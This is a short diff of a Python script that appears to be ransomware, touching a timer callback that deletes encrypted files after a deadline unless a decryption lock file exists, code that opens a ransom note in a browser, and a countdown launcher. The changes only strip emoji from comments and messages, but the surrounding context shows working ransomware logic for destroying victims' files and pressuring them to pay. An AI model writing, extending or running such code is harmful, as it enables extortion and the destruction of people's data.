@@ -206,19 +206,19 @@ def encrypt_files(root_directory, cipher):
 
 
 def on_timeup():
-    # ✅ Skip deletion if decryption succeeded
+    #  Skip deletion if decryption succeeded
     if os.path.exists("decryption_success.lock"):
         logging.info("Decryption lock detected. Skipping file deletion.")
-        print("🔓 Decryption was successful earlier. Skipping file deletion.")
+        print("Decryption was successful earlier. Skipping file deletion.")
         return
 
-    # ✅ Skip deletion if encrypted list is missing
+    # Skip deletion if encrypted list is missing
     if not os.path.exists("encrypted_files.txt"):
         logging.warning("encrypted_files.txt not found. Skipping deletion.")
-        print("⚠️ Encrypted file list not found. Skipping deletion.")
+        print("⚠ Encrypted file list not found. Skipping deletion.")
         return
 
-    # ✅ Proceed with deletion if no lock and list exists
+    #  Proceed with deletion if no lock and list exists
     for path in encrypted_file_paths:
         try:
             os.remove(path)
@@ -262,10 +262,10 @@ if __name__ == "__main__":
             logging.info("Ransom note opened in browser.")
         else:
             logging.error("Ransom note not found after generation.")
-            print("❌ Ransom note file does not exist.")
+            print(" Ransom note file does not exist.")
     except Exception as e:
         logging.error(f"Failed to open ransom note: {e}")
-        print(f"❌ Could not open ransom note: {e}")
+        print(f" Could not open ransom note: {e}")
 
     # Countdown script logic
     countdown_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "countdown.py")
